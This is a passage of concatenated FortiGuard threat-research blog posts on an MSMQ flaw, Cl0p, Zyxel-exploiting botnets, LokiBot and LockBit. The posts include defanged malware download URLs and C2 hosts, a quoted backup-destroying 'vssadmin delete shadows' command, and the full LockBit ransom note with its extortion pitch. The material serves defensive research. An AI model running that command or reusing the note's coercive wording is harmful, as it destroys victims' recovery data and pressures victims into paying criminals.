signatureMS.Windows.MSMQ.CVE-2023-21554.Remote.Code.Executionto detect this issue. This vulnerability is a result of a manual code audit. After analyzing the previous vulnerabilities, we looked into the message headers that have not performed a sanity check on their data structure. As a result, the CompoundMessage header caught our attention. Figure 11 defines the CompoundMessage header data structure. Based on our analysis, the message header was referenced in CQmPacket::GetPacketBody. This function will retrieve data from the MsgBodySize field. An out-of-bounds write will occur when the data is dereferenced without any sanity check in functions such as CQmPacket::Decrypt, VerifySignature10, and VerifySignature20, just to name a few. Apart from the CompoundMessage header, the SecurityHeader is also required in the crafted network packet to trigger this vulnerability. Notably, all the data fields in the SecurityHeader data structure are properly validated. A malformed data structure in the CompoundMessage header could affect the MSMQ kernel mode component, MQAC.SYS. Our fuzzer uncovered the faulty code path to trigger the out-of-bounds write in MQAC.SYS with a properly defined SrmpEnvelopeHeader that holds SOAP XML contents to the target queue. Figure 12 shows the crash call stack in MQAC.SYS when it leverages the unsanitized length in the CompoundMessage header. FortiGuard Labs has released the IPS signatureMS.Windows.MSMQ.CompoundMessage.Remote.Code.Executionto detect this issue. Fortinet customers can use FortiDAST to identify any network assets that may be vulnerable to the MSMQ vulnerabilities discussed previously. FortiGuard Labs has also released IPS signatures to protect our customers from the vulnerabilities mentioned in this post. Again, we can’t emphasize enough the urgency to apply the latest Microsoft patches to prevent you or your organization from falling victim to a devastating cyberattack. FortiDASTcustomers are able to detect the existence of these vulnerabilities in their assets.Fortinet IPS customers are protected with the following signatures, which were previously released for these vulnerabilities: If you believe these or any other cybersecurity threats have impacted your organization, please contact ourGlobal FortiGuard Incident Response Team.

    "title": "Ransomware Roundup - Cl0p",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-cl0p",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Cl0p ransomware. Affected platforms:Microsoft Windows, LinuxImpacted parties:Microsoft Windows, Linux UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryption and not to leak stolen filesSeverity level:High Recently, the Cl0p ransomware group received a lot of media attention for compromising a large number of organizations by exploiting a recently-unpatched vulnerability in MOVEit Transfer (CVE-2023-34362), a managed file transfer (MFT) solution. Although there is no evidence that the threat actor used the encryptor in this particular incident, the group exfiltrated data from victims and threatened them with ransom in exchange for not exposing the stolen information. This blog provides insights into the Cl0p ransomware group’s activities over the past several years. Note that FortiGuard Labs released an Outbreak Alert for the MOVEit Transfer incident. Please refer to “Progress MOVEit Transfer SQL Injection Vulnerability” for additional information. The history of Cl0p ransomware goes back to early 2019 and is typically associated with financially motivated threat actor FIN11 (also known as TA505 and Snakefly), who is known to target organizations in North America and Europe. The Cl0p ransomware appears to be a descendent (or variant) of another ransomware, “CryptoMix”, which also has an association with FIN11. And CryptoMix is reportedly a hybrid of the ransomware variants “CryptXXX” and “CryptoWall”. However, that claim has not yet been independently verified by FortiGuard Labs. Typically, FIN11 unleashes Cl0p ransomware on a victim’s network to encrypt files after stealing information. However, the ransom note dropped by an older Cl0p ransomware variant, shown below, shows no evidence of FIN11 having exploited victim data, at least during the early period of Cl0p ransomware activity. It is estimated that they only began exfiltrating victim information around the time the leak site described later in this report was set up. At some stage in its operations, the FIN11 group revised its strategy of deploying ransomware and shifted to purely exfiltrating information from victims for extortion. In fact, there is no evidence that the Cl0p ransomware was deployed when the MOVEit Transfer vulnerability was recently exploited. Deployed Cl0p ransomware variants append a new file extension to the files it encrypts. Typical file extensions include, but are not limited to, “.Clop”, “.Cl0p”, “.C_L_O_P”, “.C_I_0P” and “.Cllp”. Cl0p ransomware ransom notes are labeled “ClopReadMe.txt”, “README_README.txt” and “!!!_READ_!!!.RTF”. The Cl0p threat actor is also associated with the use of the Cobalt Strike post-exploitation tool, web shells such as DEWMODE and LEMURLOOT,  SDBot, and the FlawedAmmyy remote access trojan (RAT). FIN11 is also known to use spear-phishing to target victims. FIN11 recently leveraged the MOVEit Transfer SQL injection vulnerability (CVE-2023-34362) to gain initial entry to victim networks. This was not the first time the group has exploited vulnerabilities. According toa reportpublished by the Health Sector Cybersecurity Coordination Center (HC3), the following vulnerabilities have been potentially exploited by this group: While earlier Cl0p ransomware variants only include an attacker’s contact email addresses, the ransom group subsequently set up a data leak site on TOR in 2020 called “CL0P^_-LEAKS” to post information stolen from victims. On the TOR site, the ransomware group also states that its primary motivation is financial gain and that it is not politically motivated in its choice of victims. The group also claims that it intends to attack commercial pharmaceutical companies, but not hospitals and social institutions. As of July 15th, 2023, Fortinet's FortiRecon service listed 419 victim organizations on the Cl0p ransomware data leak site. According to data collected through Fortinet's FortiRecon service, the Cl0p ransomware group preyed on several industry sectors between January and June 2023, with business services leading the way, followed by software and finance. When victim organizations are classified by country, the United States is in first place by a significant margin. By region, nearly three-quarters of victims are located in North America and Europe. The FortiRecon data below indicates that the Cl0p ransomware has been more active in 2023 than 2022 and 2021. The inactivity of the ransomware group from May to July 2021 could be attributed tothe arrest of some Cl0p ransomware operatorsin June 2021, though we cannot verify this. Looking closely at the prevalence of Cl0p ransomware in the United States during the first half of 2023, Cl0p ranked third behind LockBit and Blackcat (ALPHV) ransomware. The Cl0p ransomware has been around since early 2019, and its developers are still one of the most active ransomware threat actors today. While they seem to have largely shifted from \"exfiltrating and encrypting data and extorting money\" to simply \"exfiltrating data and extorting money,\" affected organizations are just as impacted as before. As the group is known to exploit high-severity vulnerabilities, including the recently disclosed MOVEit Transfer vulnerability, patch management is critical to preventing attacks by the group. Note that a large number of Cl0p ransomware samples exist due to the high prevalence of the ransomware over the past several years. Because of this, this section only contains a small number of samples from the ransomware family.

Since the majority of ransomware is generally delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Fortinet’s FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations also need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Organizations are encouraged to implement cloud-based security solutions, such asSASE, to protect off-network devices, advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack, andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context. These solutions are proven to minimize risk and reduce the impact of a successful ransomware attack. By operating these solutions as part of the industry's only fully integratedSecurity Fabric, organizations can also take advantage of native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings that can be deployed independently or as part of the Fortinet Security Fabric. These services are powered by advanced AI-enabled technologies and our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).

    "content": "FortiGuard Labs Threat Research Affected platforms:LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity level:Critical In June 2023, FortiGuard Labs detected the propagation of several DDoS botnets exploiting the Zyxel vulnerability (CVE-2023-28771). This vulnerability is characterized by a command injection flaw affecting multiple firewall models that could potentially allow an unauthorized attacker to execute arbitrary code by sending a specifically crafted packet to the targeted device. The severity of this flaw, rated 9.8 on theCVSSscoring system, was reported by researchers fromTRAPA Security. Zyxel released asecurity advisoryregarding this vulnerability on April 25, 2023. Subsequently, the Cybersecurity and Infrastructure Security Agency (CISA) added this security flaw to itsKnown Exploited Vulnerabilities(KEV) catalog in May. Through the capture of exploit traffic, the attacker's IP address was identified, and it was determined that the attacks were occurring in multiple regions, including Central America, North America, East Asia, and South Asia. Since the publication of theexploit module,there has been a sustained surge in malicious activity. Analysis conducted by FortiGuard Labs has identified a significant increase in attack bursts starting from May, as depicted in the trigger count graph shown in Figure 1. We also identified multiple botnets, including Dark.IoT, a variant based on Mirai, as well as another botnet that employs customized DDoS attack methods. In this article, we will provide a detailed explanation of the payload delivered through CVE-2023-28771 and associated botnets. Based on our observations over the past month, we have noted that these attacks originate from distinct IP addresses: 193[.]32[.]162[.]190, 109[.]205[.]213[.]30, 109[.]207[.]200[.]42, 109[.]207[.]200[.]47 and 109[.]207[.]200[.]44. These attacks specifically target the command injection vulnerability in the Internet Key Exchange (IKE) packet transmitted over UDP on Zyxel devices. The attackers utilize tools such as curl or wget to download scripts for further actions. Below, you can find the corresponding traffic capture illustrating these activities. The script files obtained in these attacks exclusively download files tailored for the MIPS architecture, indicating a highly specific target. In Figure 3, the script downloads a file named \"lolmips\" from the IP address 92[.]118[.]39[.]16 and saves it as \".zw\". Subsequently, it executes with the \"zywall\" parameter indicating its connection to the Zyxel firewall vulnerability. The script file shown in Figure 4 was downloaded from 171[.]22[.]136[.]15, which has been associated with theRapperbotmalware. However, we observed this script being forwarded to 171[.]22[.]136[.]18, where it dropped additional MIPS files for subsequent actions. The script files in Figure 5 exhibit similar code patterns despite originating from different server IP addresses. These scripts employ the \"rm -rf\" command to remove the \".zw\" file from the temporary folder and save the current file as \"/tmp/a\". Notably, the execution files display resemblances. It appears that this campaign utilized multiple servers to launch attacks and updated itself within a few days to maximize the compromise of Zyxel devices. In the following sections, we introduce the botnets we have identified as spreading via CVE-2023-28771 over the past month. Based on the C2 server list, which includes numerous domains with the \".lib\" extension, including some used in previous versions, we identified this variant as Dark.IoT. Dark.IoT first emerged in 2021 and has established itself as a prolific botnet that extends its targeting beyond IoT devices. It updated its C2 server in April with \"raw.pastebin.com,\" and we encountered a newer version in June. One prominent feature of Dark.IoT is the presence of the data string \"pte8cjbdwrmn57g4i6qual20s1k3vfoh,\" which generates random alphanumeric strings during the setup process. The corresponding function can be seen in Figure 6. Dark.IoT employs the ChaCha20 algorithm to encrypt its configuration. During the decryption process, it first performs an XOR operation on the 32-byte decryption key with the value 0x55. Subsequently, it utilizes this modified key along with a nonce to invoke the ChaCha20 decryption function. The code responsible for this decryption process is displayed in Figure 7. Upon successful decryption, the identified C2 servers are as follows. (Notably, the last two servers, namely \"routercontroller[.]geek\" and \"dvrcontroller[.]libre,\" have been newly added in this version. Dark.IoT utilizes the OpenNIC server with the IP address \"147.182.243.49\" for DNS resolution and establishes communication with the C2 servers.) Figure 8 illustrates the victim's keep-alive message, identified as \"GET / HTTP/1.1\\r\\n\\r\\n\". Once the victim system receives the attack command, it starts a DDoS attack on a specific IP address and port number. One example of this DDoS attack traffic is shown below. This particular botnet, derived from a Mirai variant, features encoded configurations and a collection of XOR keys. It employs an index-based method to decode the data retrieved from the \".rodata\" section. As an illustration, when the index is set to 0, the corresponding key value is 0xCE (calculated as 0x2E ^ 0x0E ^ 0x16 ^ 0xF8), as depicted in Figure 10. After execution, the program prints \"listening tun0\" in the console. It then utilizes the XOR decoding function shown in Figure 11 to obtain the C2 servers. The victim system subsequently sends a hard-coded hex value of 0x17b99063 and appends the victim's public IP address. The captured C2 traffic is displayed in Figures 12 and 13. As mentioned in the initial section, this campaign has demonstrated a pattern of frequent updates within a short timeframe. Our initial discovery of this botnet took place on May 25, 2023. But our analysis identified a similar environment-checking process across different samples. The sample obtained on May 25 did not contain a clear string indicating its C2 domain. However, after June, we observed a change in the domain structure, with the C2 domains now prefixed with \"new.” For the remainder of this section, we will concentrate on the sample collected on June 26 and provide the derived findings. Initially, the botnet verifies whether a specific parameter is present. If the parameter is absent, it assigns the value \"unknown\" and continues with the execution. Next, the botnet retrieves self-information from the \"/proc/self/maps\" file to perform additional checks on the execution path. It ensures that the execution path is not \"/lib\", \"/sbin/\", or \"/usr/\". If the checking fails, the execution is immediately aborted, and the botnet terminates itself. Afterward, the botnet proceeds by generating a random integer using \"time()\" and \"pid()\" for the forked process. The code responsible for this process is presented in Figure 17. Before connecting with the C2 server, the malware initializes all DDoS attack functions. This botnet encompasses a total of 11 methods, namely udpflood, synflood, greflood, ackflood, tcpflood, tcp2flood, udp2flood, socketflood, udpconnflood, wraflood, and vseflood. The initial packet transmitted to the server contains parameters derived from the script file obtained via CVE-2023-28771. This packet is prefixed with \"TCP Connect,\" shown in Figure 19, which provides a detailed representation of this communication. The C2 server issues commands that the botnet handles using a switch case structure, incorporating the following capabilities: By examining the attack method names, we were able to trace back to another sample associated with the C2 domain \"djk38zbdhqpdlshfb[.]shinji[.]app.\" Additionally, we discovered a Telegram group called \"SHINJI.APP | Katana botnet\" that is actively involved in updating the botnet's methods and performing maintenance tasks. The botnet's owner has recently updated its methods, as demonstrated in Figure 20, where the method names align with those found in the MIPS execution file. Targeting vulnerable devices has always been a primary objective for threat actors, and the prevalence of remote code execution attacks poses a major concern for IoT devices and Linux servers. The presence of exposed vulnerabilities in devices can lead to significant risks. Once an attacker gains control over a vulnerable device, they can incorporate it into their botnet, enabling them to execute additional attacks, such as DDoS.

    "title": "LokiBot Campaign Targets Microsoft Office Document Using Vulnerabilities and Macros",
    "link": "https://www.fortinet.com/blog/threat-research/lokibot-targets-microsoft-office-document-using-vulnerabilities-and-macros",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows usersImpact:Control and collect sensitive information from a victim’s deviceSeverity level:Critical In a recent FortiGuard Labs investigation, we came across several malicious Microsoft Office documents designed to exploit known vulnerabilities. Specifically, CVE-2021-40444 and CVE-2022-30190 are remote code execution vulnerabilities. Exploiting these vulnerabilities allowed the attackers to embed malicious macros within Microsoft documents that, when executed, dropped the LokiBot malware onto the victim's system. LokiBot, also known as Loki PWS, has been a well-known information-stealing Trojan active since 2015. It primarily targets Windows systems and aims to gather sensitive information from infected machines. In this article, we will delve into the specifics of the identified documents, explore the payload they delivered, and outline the behavioral patterns exhibited by LokiBot. Our analysis aims to shed light on the intricacies of this threat and increase awareness regarding its operational methods. During May 2023, we obtained two types of Word documents for analysis. The first type featured an external link embedded within an XML file, “word/_rels/document.xml.rels,” while the second type included a VBA script that executed a macro immediately upon opening the document. Notably, both files contained a strikingly similar bait image, depicted in Figure 1. The Word document that targets CVE-2021-40444 contained a file “document.xml.rels”, shown in Figure 2, with an external link using MHTML (MIME encapsulation of aggregate HTML documents). This web archive file format combines a website's HTML code and companion resources into a single file. This link also uses Cuttly, a URL shortener and link management platform, to redirect users to the cloud file-sharing website, “GoFile.” Further analysis revealed that a file named “defrt.html” was downloaded upon accessing the link. This file exploits the second vulnerability, CVE-2022-30190. The content of this file and the decoded data is displayed in Figure 3. Upon executing the payload, it initiates the download of an injector file named “oehrjd.exe” from the following URL: http[:]//pcwizard[.]net/yz/ftp/. Detailed information regarding the execution file can be found in the subsequent section. The second document was discovered towards the end of May. Upon analyzing the VBA script embedded within the Word document, as illustrated in Figure 4, the code is automatically executed due to its use of the “Auto_Open” and “Document_Open” functions. Various arrays are decoded within the script and saved to a temporary folder under the name “DD.inf” (Figure 5). It includes a command to create an “ema.tmp” file to store data after line 29 in the “DD.inf” file. The data is then encoded using the “ecodehex” function and saved as “des.jpg”. The script then uses rundll32 to load a DLL file with the function “maintst.” Finally, it deletes all temporary, JPG, and INF files created throughout this process. As mentioned, the VBA script creates an INF file to load a DLL. The purpose of this DLL file, named “des.jpg,” is to download an injector from the URL “https[:]//vertebromed[.]md/temp/dhssdf[.]exe” for use in a later stage. It's worth noting that the download link doesn't belong to a typical file-sharing cloud platform or the attacker's command-and-control (C2) server. Instead, it leverages the website “vertebromed.md,” which has been active since 2018. The injector file, “dhssdf.exe,” was created on May 29, 2023, as shown in Figure 6. Additionally, within the same folder, we discovered another MSIL loader named “IMG_3360_103pdf.exe,” created on May 30, 2023. Although this file isn't directly involved in the Word document attack chain, it also loads LokiBot and connects to the same C2 IP. In this section, we analyze the injector obtained from Follina (SHA256: 9eaf7231579ab0cb65794043affb10ae8e4ad8f79ec108b5302da2f363b77c93). The injector is written in Visual Basic (VB), and we provide an overview of its basic information in Figure 7. Initially, the code extracts individual letters from predetermined strings. These letters are then combined to form an API string, subsequently mapped to the corresponding functions illustrated in Figure 8. The injector utilizes a hardcoded key to decrypt the payload, as shown in Figure 9. The decryption process is outlined in pseudo-code in Figure 10. The decrypted data is decompressed using the “RtlDecompressBufferEx” API and the parameter “COMPRESSION_FORMAT_LZNT1”. The complete procedure through Python code and the partial payload is illustrated in Figure 11. The injector incorporates various evasion techniques, including: After obtaining the payload and verifying the overall environment, the injector utilizes the “VirtualAllocEx” function to allocate memory for the subsequent execution of LokiBot. LokiBot is specifically designed to gather sensitive information from various sources, including web browsers, FTP, email, and numerous software tools installed on the compromised system. Analyzing the C2 traffic to “95[.]164[.]23[.]2/swe/h/pin[.]php” in Figure 13, we determined that the version is 0x0012 and the notable Binary ID is “ckav[.]ru”. As this version of LokiBot has remained unchanged since March, we will only highlight its major components and features. First, the MD5 hash derived from the MachineGuid is in the end pcap, “D0BECCE5760947DD9FFD80DB”. This hash serves as a mutex to ensure that multiple instances of LokiBot are not running simultaneously. It employs the “MoveFileExW” API to create a folder named “%APPDATA%\\Roaming\\576094” and a file named “47DD9F.exe” using a substring of the MD5 from MachineGuid. The file is marked as hidden by the “SetFileAttributes” function and setting the attribute to FILE_ATTRIBUTE_HIDDEN (0x2). The corresponding registry settings associated with LokiBot are depicted in Figure 14. The list of targeted software names is stored in an array, and a partial list is provided in Figure 15. LokiBot is a long-standing and widespread malware active for many years. Its functionalities have matured over time, making it easy for cybercriminals to use it to steal sensitive data from victims. The attackers behind LokiBot continually update their initial access methods, allowing their malware campaign to find more efficient ways to spread and infect systems. LokiBot exploits various vulnerabilities and employs VBA macros to launch its attacks. It also leverages a VB injector to employ several techniques to evade detection or analysis. As a result, it can bypass certain security measures and pose a significant threat to users. To protect themselves, users should exercise caution when dealing with any Office documents or unknown files, especially those that contain links to external websites. It is essential to be vigilant and avoid clicking on suspicious links or opening attachments from untrusted sources. Additionally, keeping the software and operating systems up to date with the latest security patches can help mitigate the risk of exploitation by malware. This malware is detected and blocked by FortiGuard Antivirus as: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service blocks the C2 server. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.

    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft Windows, Linux, ESXi, MacOSImpacted parties:Microsoft Windows, Linux, ESXi, and MacOS UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryption and not to leak stolen filesSeverity level:High On June 14th, 2023, the CISA, FBI, MS-ISAC, and multiple international cyber security organizationsreleaseda joint advisory for the LockBit ransomware. This ransomware group has been active since early 2020, targeting organizations across numerous industries, including energy and government sectors. According to the advisory, LockBit was the most active ransomware in 2022. This blog provides insights into the LockBit Group's activities over the past few years. LockBit is a ransomware group that has been active since early 2020 (the active period goes back to 2019 if its predecessor “ABCD ransomware” is included in the “LockBit” family) providing a Ransomware-as-a-Service (RaaS) service to for-hire online criminals known as affiliates. The affiliates’ job is to select and infiltrate victim organizations and deploy the ransomware provided by the LockBit developer. The developer has consistently worked to improve the ransomware: LockBit 2.0 (also known as LockBit Red) was released in mid-2021, and LockBit 3.0 (also known as LockBit Black) became available in early-2022. The latest LockBit ransomware variant, “LockBit Green,” appeared in early 2023. While the LockBit ransomware initially only supported the Windows platform, the LockBit threat actor group added support for Linux/VMware/ESXi and macOS platforms in 2021 and 2023, respectively. The group also works with partners who want to sell exfiltrated data but do not want to encrypt victims' files. LockBit uses a dual extortion tactic, demanding that victims pay a ransom to recover their files and not release the stolen information to the public. LockBit is also believed to threaten Distributed Denial of Service (DDoS) attacks against victims if the demanded ransom is not paid. Due to its prevalence and popularity among cybercriminals, FortiGuard Labs has published several blogs and threat signals for LockBit ransomware: Blog Threat Signal As a RaaS, the LockBit operator offers its affiliates a variety of options for splitting the ransom fee. The ransom payment is typically split 1:4 between the LockBit operator and the affiliates. Using the features provided by the LockBit operator, its affiliates can perform a variety of activities, including: It also has “do not target” and approved “target” industry lists for file encryption and data exfiltration. Data gathered through Fortinet’s FortiRecon service supports the CISA advisory's claim that LockBit was the most active ransomware in 2022. According to our internal research, LockBit ransomware accounted for approximately 50% of the 3,298 ransomware incidents we observed in 2022. LockBit ransomware victim organizations are spread across several industries. As explained, the LockBit operator imposes \"do not attack\" rules for specific industries and countries. However, it's up to each affiliate to follow the rules. ABCD ransomware, which first appeared in September 2019, is believed to be the predecessor of LockBit ransomware. Unlike its slightly more sophisticated successor, ABCD ransomware only allows victims to contact it using email. The ransomware also deletes shadow copies by running the commandvssadmin delete shadows /all /quiet & wmic shadowcopy delete, making it difficult to recover files. FortiGuard Labs found what appears to be an even earlier version of the ABCD ransomware (SHA2: 49c0acf512146620dd26f515804324c8e4b4cc8eb8b9ab5d9c57e201241bc7ae). While this variant encrypts files, its ransom note only contains the victim's personal ID. The transition can be seen in a subsequent ABCD ransomware sample (SHA2: c8205792fbc0a5efc6b8f0f2257514990bfaa987768c4839d413dd10721e8871). This sample drops a ransom note, “Restore-My-Files.txt,” and changes the desktop wallpaper. Both refer to LockBit, but encrypted files still have a \".abcd\" extension. It's also worth noting that the LockBit operator set up a data leak site on TOR. ABCD ransomware was rebranded as LockBit in January 2020. This new LockBit variant changes the file extensions of encrypted files to \".lockbit\" instead of \".abcd\". It drops a ransom note with the same name as the ABCD ransomware, and communication was centralized on the TOR website rather than via email. This LockBit variant also replaces the desktop wallpaper on compromised machines to indicate the presence of the ransom note. The threat actor appears to have been using two different wallpapers. LockBit ransomware was updated to LockBit 2.0 (also known as LockBit Red) in mid-2021. This new variant still appends a \".lockbit\" extension to the files it encrypts but now uses a red file icon that mimics the shape of a B. LockBit 2.0 displays a ransom note on the desktop and a text file called Restore-My-Files.txt. This time, the LockBit threat actor added an alternate website that can be accessed through regular web browsers. In October 2021, the LockBit developer released a new LockBit ransomware variant designed to work on Linux and ESXi virtual machines. Like the Windows version, this new LockBit variant encrypts files on compromised devices and leaves a ransom note called \"restore-my-files.txt.\" LockBit 3.0 was released in March 2022. This variant appends a random 9-character file extension instead of the \".lockbit\" extension used by the two previous LockBit variants. It also changes the file icon of the encrypted files to a black file icon that mimics the shape of a B. LockBit 3.0 drops a ransom note labeled \"[random nine letters]_README_txt.\" The threat actor also set up more mirror TOR and regular websites in case they become inaccessible. This turned out to be the right move, as in mid-2022, reported distributed denial-of-service (DDoS) attacks took down LockBit's leak sites. The group also added 'Tox' and 'Jabber' as alternative communication methods for victims. Another noteworthy addition was an advertisement for victims, in which the LockBit group seeks insiders willing to provide internal information and access to the corporate network. It also replaces the desktop wallpaper with a reference to the dropped ransom note. The latest LockBit ransomware variant, \"LockBit Green,\" appeared in January 2023. A random 8-character extension is now added to the LockBit Green extension, and LockBit Green leaves a ransom note titled, \"!!!-Restore-My-Files-!!!.txt\". This new variant also contains a new encryption tool based on the leaked Conti source code. The comprehensive LockBit Green ransom note is reproduced below, as the ransom note dropped by the ransomware is badly formatted. ~~~ LockBit 3.0 the world’s fastest and most stable ransomware from 2019~~~ >>>>> Your data is stolen and encrypted. If you don’t pay the ransom, the data will be published on our TOR darknet sites.

We are the oldest ransomware affiliate program on the planet, nothing is more important than our reputation. We are not a politically motivated group and we want nothing more than money. If you pay, we will provide you with decryption software and destroy the stolen data. After you pay the ransom, you will quickly make even more money. Treat this situation simply as a paid training for your system administrators, because it is due to your corporate network not being properly configured that we were able to attack you. Our pentest services should be paid just like you pay the salaries of your system administrators. Get over it and pay for it. If we don’t give you a decryptor or delete your data after you pay, no one will pay us in the future.

Do not delete or modify encrypted files, it will lead to problems with decryption of files! >>>>> Don’t go to the police or the FBI for help and don’t tell anyone that we attacked you. They won’t help and will only make things worse for you. In 3 years not a single member of our group has been caught by the police, we are top notch hackers and we never leave a trail of crime. The police will try to prohibit you from paying the ransom in any way. The first thing they will tell you is that there is no guarantee to decrypt your files and remove stolen files, this is not true, we can do a test decryption before paying and your data will be guaranteed to be removed because it is a matter of our reputation, we make hundreds of millions of dollars and are not going to lose our revenue because of your files. It is very beneficial for the police and FBI to let everyone on the planet know about your data leak because then your state will get the fines budgeted for you due to GDPR and other similar laws. The fines will be used to fund the police and the FBI, they will eat more sweet coffee donuts and get fatter and fatter. The police and the FBI don’t care what losses you suffer as a result of our attack, and we will help you get rid of all your problems for a modest sum of money. Along with this you should know that it is not necessarily your company that has to pay the ransom and not necessarily from your bank account, it can be done by an unidentified person, such as any philanthropist who loves your company, for example, Elon Musk, so the police will not do anything to you if someone pays the ransom for you. If you’re worried that someone will trace your bank transfers, you can easily buy cryptocurrency for cash, thus leaving no digital trail that someone from your company paid our ransom. The police and FBI will not be able to stop lawsuits from your customers for leaking personal and private information. The police and FBI will not protect you from repeated attacks. Paying the ransom to us is much cheaper and more profitable than paying fines and legal fees. >>>>> What are the dangers of leaking your company’s data. First of all, you will receive fines from the government such as the GDRP and many others, you can be sued by customers of your firm for leaking information that was confidential. Your leaked data will be used by all the hackers on the planet for various unpleasant things. For example, social engineering, your employees’ personal data can be used to re-infiltrate your company. Bank details and passports can be used to create bank accounts and online wallets through which criminal money will be laundered. On another vacation trip, you will have to explain to the FBI where you got millions of dollars worth of stolen cryptocurrency transferred through your accounts on cryptocurrency exchanges. Your personal information could be used to make loans or buy appliances. You would later have to prove in court that it wasn’t you who took out the loan and pay off someone else’s loan. Your competitors may use the stolen information to steal technology or to improve their processes, your working methods, suppliers, investors, sponsors, employees, it will all be in the public domain. You won’t be happy if your competitors lure your employees to other firms offering better wages, will you? Your competitors will use your information against you. For example, look for tax violations in the financial documents or any other violations, so you have to close your firm. According to statistics, two thirds of small and medium-sized companies close within half a year after a data breach. You will have to find and fix the vulnerabilities in your network, work with the customers affected by data leaks. All of these are very costly procedures that can exceed the cost of a ransomware buyout by a factor of hundreds. It’s much easier, cheaper and faster to pay us the ransom. Well and most importantly, you will suffer a reputational loss, you have been building your company for many years, and now your reputation will be destroyed. Read more about the GDRP legislation:hxxps://en.wikipedia[.]org/wiki/General_Data_Protection_Regulationhxxps://gdpr[.]eu/what-is-gdpr/hxxps://gdpr-info[.]eu/ >>>>> Don’t go to recovery companies, they are essentially just middlemen who will make money off you and cheat you. We are well aware of cases where recovery companies tell you that the ransom price is 5 million dollars, but in fact they secretly negotiate with us for 1 million dollars, so they earn 4 million dollars from you. If you approached us directly without intermediaries you would pay 5 times less, that is 1 million dollars. >>>> Very important! For those who have cyber insurance against ransomware attacks. Insurance companies require you to keep your insurance information secret, this is to never pay the maximum amount specified in the contract or to pay nothing at all, disrupting negotiations. The insurance company will try to derail negotiations in any way they can so that they can later argue that you will be denied coverage because your insurance does not cover the ransom amount. For example your company is insured for 10 million dollars, while negotiating with your insurance agent about the ransom he will offer us the lowest possible amount, for example 100 thousand dollars, we will refuse the paltry amount and ask for example the amount of 15 million dollars, the insurance agent will never offer us the top threshold of your insurance of 10 million dollars. He will do anything to derail negotiations and refuse to pay us out completely and leave you alone with your problem. If you told us anonymously that your company was insured for $10 million and other important details regarding insurance coverage, we would not demand more than $10 million in correspondence with the insurance agent. That way you would have avoided a leak and decrypted your Information. But since the sneaky insurance agent purposely negotiates so as not to pay for the insurance claim, only the insurance company wins in this situation. To avoid all this and get the money on the insurance, be sure to inform us anonymously about the availability and terms of insurance coverage, it benefits both you and us, but it does not benefit the insurance company. Poor multimillionaire insurers will not starve and will not become poorer from the payment of the maximum amount specified in the contract, because everyone knows that the contract is more expensive than money, so let them fulfill the conditions prescribed in your insurance contract, thanks to our interaction. In April 2023, samples of LockBit for MacOS were submitted to a public file scanning service. Now that LockBit covers all major platforms (Windows, Linux, ESXi, and MacOS), LockBit developers look to stay one step ahead of competitors and further expand their influence. Evidence that they plan to take their efforts further was uncovered in late 2022 when a post offering to purchase the Raccoon Stealer source code was discovered. This addition to their arsenal would enable them to integrate known infostealer code into the LockBit ransomware. LockBit's initial access vectors include exploiting vulnerabilities and exposed Remote Access Protocol (RDP), drive-by compromise, and the use of phishing and spear-phishing emails. The LockBit group is also known to purchase existing access to targeted organizations from initial access brokers on the dark web. According to the CISA advisory, the LockBit ransomware group is reportedly exploiting the following N-day vulnerabilities: Please note that there are patches available for all of these security vulnerabilities. After LockBit affiliates gain access to victim environments, the attackers move laterally across compromised networks and exfiltrate information using various custom and dual-use tools, such as Stealbit and rclone, living-off-the-land tactics, and publicly available file-sharing services. LockBit has a data leak site on TOR where LockBit affiliates can post information about victims and their stolen data. Each victim has their own page with a countdown timer and examples of stolen information. In some cases, LockBit threat actors offer to extend the ransom deadline, download stolen information, and destroy all copies for a fee. The LockBit group also offers a file-sharing service that supports files up to 2GB. The service also has options to automatically remove uploaded files after 24 hours, seven days, or on the first download, as well as a password setting. A data leak page with search functionality is also available. The LockBit leak site was initially not as sophisticated as it is today—proof that the LockBit developer has put much effort into improving the site along with improvements to the ransomware code over the years. The below figure of the LockBit Data Leak site is courtesty ofid-ransomware. The LockBit Group has worked hard to improve its services to those who work with them. These efforts have enabled LockBit to remain at the forefront of the ransomware realm in terms of popularity and prevalence. Note that many LockBit ransomware samples exist due to the high prevalence of the 